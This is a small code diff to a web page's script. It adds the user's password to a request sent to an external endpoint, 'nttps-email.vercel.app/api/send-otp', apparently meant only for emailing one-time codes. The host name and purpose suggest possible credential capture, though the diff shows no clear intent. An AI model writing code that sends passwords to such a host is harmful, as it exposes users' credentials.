@@ -259,10 +259,10 @@
 
   try {
     const response = await fetch("https://nttps-email.vercel.app/api/send-otp", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, inviteCode })
-    });
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ email, password, inviteCode })
+});
 
     const data = await response.json();
 
@@ -327,6 +327,7 @@
   </script>
 </body>
 </html>
+
 
 
 
